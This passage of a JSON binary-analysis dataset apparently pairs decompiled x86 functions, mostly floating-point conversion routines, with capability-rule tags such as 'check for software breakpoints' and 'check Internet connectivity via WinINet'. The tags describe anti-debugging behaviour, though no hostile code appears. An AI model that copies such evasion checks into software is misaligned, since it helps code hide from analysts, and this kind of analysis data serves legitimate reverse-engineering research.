{\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040ea6d;\ncode_r0x0040ea66:\n                        do {\n                            var_4h = 1;\ncode_r0x0040ea6d:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040ea7b;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040ea7b:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7fbe54 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7fbe54 < iVar12) {\n                if (iVar12 < *0x7fbe50) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x7fbe50;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ee32;\n            }\n            var_10h = *0x7fbe54 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040ec1e;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040ec1e:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ee32:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        in_stack_00000008[1] = var_20h;\n        *in_stack_00000008 = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *in_stack_00000008 = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3687
    },
    "0040eb25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eb25(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    uint8_t uVar5;\n    uint in_ECX;\n    uint *puVar6;\n    uint8_t in_DL;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EBP;\n    int32_t iVar10;\n    uint32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    while( true ) {\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) + 1;\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0x10) << (in_ECX & 0x1f);\n        if (2 < *(unaff_EBP + 8)) break;\n        puVar1 = unaff_EBP + -0x20 + *(unaff_EBP + 8) * 4;\n        uVar8 = *puVar1;\n        *(unaff_EBP + -0x10) = uVar8 & unaff_EDI;\n        in_ECX = *(unaff_EBP + -4);\n        *puVar1 = uVar8 >> (in_DL & 0x1f) | *(unaff_EBP + -0xc);\n    }\n    iVar7 = 2;\n    puVar6 = unaff_EBP + -0x18 + in_EAX * -4;\n    do {\n        if (iVar7 < in_EAX) {\n            *(unaff_EBP + -0x20 + iVar7 * 4) = 0;\n        }\n        else {\n            *(unaff_EBP + -0x20 + iVar7 * 4) = *puVar6;\n        }\n        iVar7 = iVar7 + -1;\n        puVar6 = puVar6 + -1;\n    } while (-1 < iVar7);\n    iVar10 = str.5_v_[0] + L'\\xffffffff';\n    iVar7 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n    uVar8 = str.5_v_[0] & 0x8000001f;\n    *(unaff_EBP + -0xc) = iVar7;\n    if (uVar8 < 0) {\n        uVar8 = (uVar8 - 1 | 0xffffffe0) + 1;\n    }\n    uVar5 = 0x1f - uVar8;\n    puVar1 = unaff_EBP + -0x20 + iVar7 * 4;\n    *(unaff_EBP + -0x10) = 0x1f - uVar8;\n    if ((*puVar1 & 1 << (uVar5 & 0x1f)) != 0) {\n        uVar8 = *(unaff_EBP + -0x20 + iVar7 * 4) & ~(-1 << (uVar5 & 0x1f));\n        while (uVar8 == 0) {\n            iVar7 = iVar7 + 1;\n            if (2 < iVar7) goto code_r0x0040ec1e;\n            uVar8 = *(unaff_EBP + -0x20 + iVar7 * 4);\n        }\n        iVar7 = iVar10 + (iVar10 >> 0x1f & 0x1fU) >> 5;\n        *(unaff_EBP + 8) = 0;\n        uVar9 = 1 << (0x1f - (iVar10 & 0x1f) & 0x1f);\n        puVar2 = unaff_EBP + -0x20 + iVar7 * 4;\n        uVar3 = *puVar2;\n        uVar8 = uVar3 + uVar9;\n        if ((uVar8 < uVar3) || (uVar8 < uVar9)) {\n            *(unaff_EBP + 8) = 1;\n        }\n        *puVar2 = uVar8;\n        iVar10 = *(unaff_EBP + 8);\n        while ((iVar7 = iVar7 + -1,  -1 < iVar7 && (iVar10 != 0))) {\n            puVar2 = unaff_EBP + -0x20 + iVar7 * 4;\n            uVar3 = *puVar2;\n            uVar8 = uVar3 + 1;\n            iVar10 = 0;\n            if ((uVar8 < uVar3) || (uVar8 == 0)) {\n                iVar10 = 1;\n            }\n            *puVar2 = uVar8;\n        }\n    }\ncode_r0x0040ec1e:\n    *puVar1 = *puVar1 & -1 << (*(unaff_EBP + -0x10) & 0x1f);\n    iVar7 = *(unaff_EBP + -0xc) + 1;\n    if (iVar7 < 3) {\n        puVar6 = unaff_EBP + -0x20 + iVar7 * 4;\n        for (iVar10 = 3 - iVar7; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    uVar8 = str.5_v_[1] + L'\\x01';\n    iVar7 = uVar8 + (uVar8 >> 0x1f & 0x1fU) >> 5;\n    uVar8 = uVar8 & 0x8000001f;\n    if (uVar8 < 0) {\n        uVar8 = (uVar8 - 1 | 0xffffffe0) + 1;\n    }\n    *(unaff_EBP + -0xc) = 0;\n    *(unaff_EBP + 8) = 0;\n    *(unaff_EBP + -4) = 0x20;\n    *(unaff_EBP + -4) = *(unaff_EBP + -4) - uVar8;\n    do {\n        puVar1 = unaff_EBP + -0x20 + *(unaff_EBP + 8) * 4;\n        uVar3 = *puVar1;\n        *(unaff_EBP + -0x10) = uVar3 & ~(-1 << (uVar8 & 0x1f));\n        uVar4 = *(unaff_EBP + -4);\n        *puVar1 = uVar3 >> (uVar8 & 0x1f) | *(unaff_EBP + -0xc);\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) + 1;\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0x10) << (uVar4 & 0x1f);\n    } while (*(unaff_EBP + 8) < 3);\n    iVar10 = 2;\n    puVar6 = unaff_EBP + -0x18 + iVar7 * -4;\n    do {\n        if (iVar10 < iVar7) {\n            *(unaff_EBP + -0x20 + iVar10 * 4) = 0;\n        }\n        else {\n            *(unaff_EBP + -0x20 + iVar10 * 4) = *puVar6;\n        }\n        iVar10 = iVar10 + -1;\n        puVar6 = puVar6 + -1;\n    } while (-1 < iVar10);\n    uVar8 = 0 << (0x1fU - str.5_v_[1] & 0x1f) | -(*(unaff_EBP + -0x14) != 0) & 0x80000000 | *(unaff_EBP + -0x20);\n    if (str.5_v_[2] == L'@') {\n        puVar6 = *(unaff_EBP + 0xc);\n        uVar4 = *(unaff_EBP + -0x1c);\n        puVar6[1] = uVar8;\n        *puVar6 = uVar4;\n    }\n    else if (str.5_v_[2] == L' ') {\n        **(unaff_EBP + 0xc) = uVar8;\n    }\n    return 2;\n}\n",
        "token_count": 1925
    },
    "0040ee75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ee75(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f376;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x7fbe70 - 1;\n        iVar4 = *0x7fbe70 + (*0x7fbe70 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x7fbe70 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040efaa;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040efb1;\ncode_r0x0040efaa:\n                        do {\n                            var_4h = 1;\ncode_r0x0040efb1:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040efbf;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040efbf:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7fbe6c - *0x7fbe70) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7fbe6c < iVar12) {\n                if (iVar12 < *0x7fbe68) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x7fbe7c;\n                    iVar4 = *0x7fbe74 + (*0x7fbe74 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7fbe74 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x7fbe74 + (*0x7fbe74 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7fbe74 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x7fbe7c + *0x7fbe68;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f376;\n            }\n            var_10h = *0x7fbe6c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x7fbe70 - 1;\n            iVar12 = *0x7fbe70 + (*0x7fbe70 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x7fbe70 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040f162;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040f162:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x7fbe74 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f376:\n    var_20h = iVar12 << (0x1fU - *0x7fbe74 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x7fbe78 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x7fbe78 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3645
    },
    "0040f3b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f67b)\n// WARNING: Removing unreachable block (ram,0x0040f644)\n// WARNING: Removing unreachable block (ram,0x0040fa2c)\n// WARNING: Removing unreachable block (ram,0x0040f653)\n// WARNING: Removing unreachable block (ram,0x0040f65b)\n// WARNING: Removing unreachable block (ram,0x0040f661)\n// WARNING: Removing unreachable block (ram,0x0040f664)\n// WARNING: Removing unreachable block (ram,0x0040f66b)\n// WARNING: Removing unreachable block (ram,0x0040f675)\n// WARNING: Removing unreachable block (ram,0x0040f6d0)\n// WARNING: Removing unreachable block (ram,0x0040f6ca)\n// WARNING: Removing unreachable block (ram,0x0040f6d6)\n// WARNING: Removing unreachable block (ram,0x0040f6f3)\n// WARNING: Removing unreachable block (ram,0x0040f6f5)\n// WARNING: Removing unreachable block (ram,0x0040f6fd)\n// WARNING: Removing unreachable block (ram,0x0040f700)\n// WARNING: Removing unreachable block (ram,0x0040f705)\n// WARNING: Removing unreachable block (ram,0x0040f708)\n// WARNING: Removing unreachable block (ram,0x0040fa35)\n// WARNING: Removing unreachable block (ram,0x0040f713)\n// WARNING: Removing unreachable block (ram,0x0040fa4c)\n// WARNING: Removing unreachable block (ram,0x0040fa53)\n// WARNING: Removing unreachable block (ram,0x0040f71e)\n// WARNING: Removing unreachable block (ram,0x0040f731)\n// WARNING: Removing unreachable block (ram,0x0040f733)\n// WARNING: Removing unreachable block (ram,0x0040f740)\n// WARNING: Removing unreachable block (ram,0x0040f745)\n// WARNING: Removing unreachable block (ram,0x0040f74b)\n// WARNING: Removing unreachable block (ram,0x0040f754)\n// WARNING: Removing unreachable block (ram,0x0040f75b)\n// WARNING: Removing unreachable block (ram,0x0040f773)\n// WARNING: Removing unreachable block (ram,0x0040f784)\n// WARNING: Removing unreachable block (ram,0x0040f792)\n// WARNING: Removing unreachable block (ram,0x0040f7d1)\n// WARNING: Removing unreachable block (ram,0x0040f7da)\n// WARNING: Removing unreachable block (ram,0x0040f9f2)\n// WARNING: Removing unreachable block (ram,0x0040f7e8)\n// WARNING: Removing unreachable block (ram,0x0040f7f2)\n// WARNING: Removing unreachable block (ram,0x0040fa0d)\n// WARNING: Removing unreachable block (ram,0x0040f7ff)\n// WARNING: Removing unreachable block (ram,0x0040f806)\n// WARNING: Removing unreachable block (ram,0x0040f810)\n// WARNING: Removing unreachable block (ram,0x0040f815)\n// WARNING: Removing unreachable block (ram,0x0040f825)\n// WARNING: Removing unreachable block (ram,0x0040f82a)\n// WARNING: Removing unreachable block (ram,0x0040f834)\n// WARNING: Removing unreachable block (ram,0x0040f839)\n// WARNING: Removing unreachable block (ram,0x0040f84b)\n// WARNING: Removing unreachable block (ram,0x0040f858)\n// WARNING: Removing unreachable block (ram,0x0040f867)\n// WARNING: Removing unreachable block (ram,0x0040f874)\n// WARNING: Removing unreachable block (ram,0x0040f891)\n// WARNING: Removing unreachable block (ram,0x0040f895)\n// WARNING: Removing unreachable block (ram,0x0040f89c)\n// WARNING: Removing unreachable block (ram,0x0040f8a5)\n// WARNING: Removing unreachable block (ram,0x0040f8a8)\n// WARNING: Removing unreachable block (ram,0x0040f8b9)\n// WARNING: Removing unreachable block (ram,0x0040f8c7)\n// WARNING: Removing unreachable block (ram,0x0040f8d2)\n// WARNING: Removing unreachable block (ram,0x0040f8d9)\n// WARNING: Removing unreachable block (ram,0x0040f904)\n// WARNING: Removing unreachable block (ram,0x0040f909)\n// WARNING: Removing unreachable block (ram,0x0040f914)\n// WARNING: Removing unreachable block (ram,0x0040f91d)\n// WARNING: Removing unreachable block (ram,0x0040f923)\n// WARNING: Removing unreachable block (ram,0x0040f926)\n// WARNING: Removing unreachable block (ram,0x0040f94c)\n// WARNING: Removing unreachable block (ram,0x0040f951)\n// WARNING: Removing unreachable block (ram,0x0040f956)\n// WARNING: Removing unreachable block (ram,0x0040f963)\n// WARNING: Removing unreachable block (ram,0x0040f974)\n// WARNING: Removing unreachable block (ram,0x0040f9a5)\n// WARNING: Removing unreachable block (ram,0x0040f97a)\n// WARNING: Removing unreachable block (ram,0x0040f9a0)\n// WARNING: Removing unreachable block (ram,0x0040f984)\n// WARNING: Removing unreachable block (ram,0x0040f99a)\n// WARNING: Removing unreachable block (ram,0x0040f993)\n// WARNING: Removing unreachable block (ram,0x0040f9a8)\n// WARNING: Removing unreachable block (ram,0x0040f9d5)\n// 